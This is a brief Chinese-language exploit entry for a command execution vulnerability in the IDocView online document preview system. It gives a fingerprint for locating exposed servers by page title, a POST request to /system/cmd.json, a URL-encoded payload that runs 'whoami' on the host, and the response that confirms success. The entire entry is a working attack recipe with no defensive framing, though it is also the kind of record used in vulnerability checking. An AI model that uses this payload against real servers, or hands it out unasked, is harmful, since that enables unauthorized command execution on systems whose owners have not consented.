# IDocView在线文档预览系统命令执行漏洞

IDocView ｜ 命令执行 ｜ —
- **指纹**：`title=="在线文档预览 - I Doc View"`
- **请求**：`POST /system/cmd.json HTTP/1.1`

**Payload**
```
cmd=echo+%26+%28whoami%29+%26
```
- **响应特征**：200 whoami